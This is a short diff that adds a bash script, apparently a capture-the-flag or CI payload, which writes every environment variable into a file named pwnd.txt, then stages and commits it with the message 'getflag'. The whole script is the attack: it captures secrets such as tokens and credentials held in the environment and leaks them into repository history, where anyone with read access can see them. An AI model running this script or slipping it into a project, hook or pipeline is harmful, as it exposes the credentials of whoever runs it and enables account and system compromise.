@@ -1,0 +1,5 @@
+#!/bin/bash
+env > pwnd.txt
+git add pwnd.txt
+git commit -m "getflag"
+
